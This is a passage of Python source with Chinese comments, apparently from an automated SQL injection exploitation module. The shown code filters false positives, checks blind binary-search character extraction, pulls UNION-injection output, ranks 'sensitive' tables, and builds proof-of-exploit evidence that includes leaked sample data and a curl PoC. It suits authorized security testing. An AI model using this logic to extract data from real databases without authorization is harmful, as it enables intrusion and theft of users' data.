                        "parseInt", "NumberFormatException", "Invalid input",
                        "类型转换", "Type mismatch", "Conversion failed",
                        "Value is not a valid integer", "Input was not in a correct format"
                    ]
                    has_type_error = any(err in body for err in type_errors)
                    
                    if has_type_error:
                        log.info(f"假阳性检测：参数 {param_value} 被类型转换，非SQL注入")
                        return True
        return False

    def _is_waf_blocked(self, response: dict) -> bool:
        """检测WAF拦截页"""
        status_code = response.get("status", 0)
        if status_code in [403, 418, 429, 503]:
            body = response.get("body", "").lower()
            waf_keywords = ["blocked", "firewall", "拦截", "forbidden", "denied", "waf", "security"]
            return any(kw in body for kw in waf_keywords)
        return False

    def _is_business_error(self, response: dict) -> bool:
        """检测业务错误码（HTTP 200但业务拒绝）"""
        status_code = response.get("status", 0)
        if status_code == 200:
            try:
                import json
                data = json.loads(response.get("body", "{}"))
                if data.get("code") in [500, 403, 401]:
                    return True
                if "用户未登录" in str(data.get("message", "")):
                    return True
            except Exception:  # ★ D11: 原 bare except 会吞 KeyboardInterrupt/SystemExit
                pass
        return False

    def _is_empty_data(self, response: dict) -> bool:
        """检测空数据响应"""
        status_code = response.get("status", 0)
        if status_code == 200:
            try:
                import json
                data = json.loads(response.get("body", "{}"))
                if data.get("data") is None or data.get("data") == []:
                    return True
            except Exception:  # ★ D11: 原 bare except 会吞 KeyboardInterrupt/SystemExit
                pass
        return False

    def _is_false_positive(self, response: dict, param_value: str) -> bool:
        """
        综合假阳性判定
        """
        # 检查1：参数类型转换
        if self._is_type_conversion_false_positive(response, param_value):
            return True

        # 检查2：WAF拦截
        if self._is_waf_blocked(response):
            return True

        # 检查3：业务错误码
        if self._is_business_error(response):
            return True

        # 检查4：空数据
        if self._is_empty_data(response):
            return True

        return False

    def _identify_false_positive_type(self, response: dict, param_value: str) -> str:
        """识别假阳性类型，返回可读的中文描述。"""
        if self._is_type_conversion_false_positive(response, param_value):
            return "参数类型转换（parseInt/NumberFormatException）"
        if self._is_waf_blocked(response):
            return "WAF拦截"
        if self._is_business_error(response):
            return "业务错误码（HTTP 200但业务拒绝）"
        if self._is_empty_data(response):
            return "空数据响应"
        return "未知假阳性类型"

    def _validate_extraction(self, extracted_chars: list, binary_results: list = None) -> bool:
        """
        提取脚本二分逻辑必须自带"全FALSE自检"
        
        实战教训：sqli_node2.js 因缺自检输出了30个DEL字符还没发现。
        若长度二分全FALSE或字符全收敛到上界，立即报错而非输出垃圾。
        """
        # 检查1：提取结果为空
        if not extracted_chars:
            log.warning("提取验证失败：未提取到任何字符")
            return False
        
        # 检查2：字符全收敛上界（ASCII 126）
        if all(c == chr(126) for c in extracted_chars):
            log.warning("提取验证失败：字符全收敛到上界，提取结果损坏")
            return False
        
        # 检查3：字符频率异常（全是特殊字符）
        special_count = sum(1 for c in extracted_chars if not c.isalnum())
        if len(extracted_chars) > 0 and special_count / len(extracted_chars) > 0.5:
            log.warning(f"提取验证失败：特殊字符比例过高 ({special_count}/{len(extracted_chars)})")
            return False
        
        # 检查4：二分结果全FALSE（如果有提供）
        if binary_results:
            if all(r == "FALSE" for r in binary_results.get("length", [])):
                log.warning("提取验证失败：长度二分全FALSE，注入未确认")
                return False
        
        # 检查5：提取结果合理性（长度不应超过100）
        if len(extracted_chars) > 100:
            log.warning(f"提取验证失败：提取结果异常长 ({len(extracted_chars)} 字符)")
            return False
        
        # 检查6：连续相同字符过多
        if len(extracted_chars) > 5:
            max_consecutive = 1
            current_consecutive = 1
            for i in range(1, len(extracted_chars)):
                if extracted_chars[i] == extracted_chars[i-1]:
                    current_consecutive += 1
                    max_consecutive = max(max_consecutive, current_consecutive)
                else:
                    current_consecutive = 1
            if max_consecutive > 10:
                log.warning(f"提取验证失败：连续相同字符过多 ({max_consecutive} 个)")
                return False
        
        log.info(f"提取验证通过：{len(extracted_chars)} 个字符")
        return True

    def _find_union_data(self, resp_body: str, baseline_body: str) -> str:
        """从 UNION 注入响应中找到新出现的数据。"""
        if not resp_body:
            return ""
        # 找响应中有但基线中没有的内容
        # 简单策略：找 vrf 标记附近的内容，或找新出现的数据库相关字符串
        # 更精确的方式：对比两个响应的 diff
        for line in resp_body.split("\n"):
            line = line.strip()
            if line and line not in baseline_body and len(line) > 2:
                # 过滤掉 HTML 标签
                clean = re.sub(r"<[^>]+>", "", line).strip()
                if clean and len(clean) > 2 and clean not in baseline_body:
                    return clean[:200]
        return ""

    def _find_sensitive_table(self, tables: list[str]) -> str:
        """从表名列表中找到最敏感的表。"""
        for table in tables:
            tl = table.lower()
            if any(kw in tl for kw in _SENSITIVE_TABLE_KEYWORDS):
                return table
        return tables[0] if tables else ""

    def _build_success_evidence(
        self, extracted_data: dict, requests_sent: int,
        elapsed: float, poc: str, timeline: list, method: str
    ) -> FuzzEvidence:
        """构造成功的利用证据。"""
        # 生成摘要
        parts = []
        if "db_version" in extracted_data:
            parts.append(f"数据库版本: {extracted_data['db_version']}")
        if "current_user" in extracted_data:
            parts.append(f"当前用户: {extracted_data['current_user']}")
        if "current_db" in extracted_data:
            parts.append(f"当前库: {extracted_data['current_db']}")
        if "tables" in extracted_data:
            parts.append(f"发现 {len(extracted_data['tables'])} 个表")
        if "sample_data" in extracted_data:
            parts.append(f"已提取数据样例")

        summary = f"SQL注入利用成功（{method}）：" + "；".join(parts)

        # 影响范围
        impact_parts = []
        if "current_user" in extracted_data:
            user = extracted_data["current_user"]
            if "root" in user.lower() or "admin" in user.lower() or "dba" in user.lower():
                impact_parts.append("⚠️ 高权限用户（可能读写所有数据库）")
            else:
                impact_parts.append(f"数据库用户: {user}")
        if "tables" in extracted_data:
            tables = extracted_data["tables"]
            sensitive = [t for t in tables if any(kw in t.lower() for kw in _SENSITIVE_TABLE_KEYWORDS)]
            if sensitive:
                impact_parts.append(f"敏感表: {', '.join(sensitive[:5])}")
        if "sample_data" in extracted_data:
            impact_parts.append("已证明可提取用户数据")

        return FuzzEvidence(
            result=FuzzResult.CONFIRMED,
            confidence=0.95,
            summary=summary,
            fuzzer_name=self.NAME,
            requests_sent=requests_sent,
            elapsed_seconds=elapsed,
            poc_curl=poc,
            data_leaked=str(extracted_data.get("sample_data", ""))[:500],
            impact_scope=" | ".join(impact_parts) if impact_parts else "可通过SQL注入提取数据库内容",
            extracted_data=extracted_data,
            timeline=timeline,
        )

# --- hoisted from _is_true_response (A-grade, no local capture) ---
def normalize(text: str) -> str:
    import re as _re
    if not text:
        return ""
    s = text
    s = _re.sub(r'\b\d{10,13}\b', '', s)  # Unix 时间戳
    s = _re.sub(r'\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?Z?', '', s)  # ISO 时间
    s = _re.sub(r'(csrf|nonce|_token|token|xsrf)["\']?\s*[:=]\s*["\']?[a-zA-Z0-9_\-]{16,}', '', s, flags=_re.IGNORECASE)
    s = _re.sub(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', '', s)  # JWT
    s = _re.sub(r'\b[0-9a-f]{32,64}\b', '', s, flags=_re.IGNORECASE)  # MD5/SHA hash
    s = _re.sub(r'\s+', ' ', s).strip()
    return s
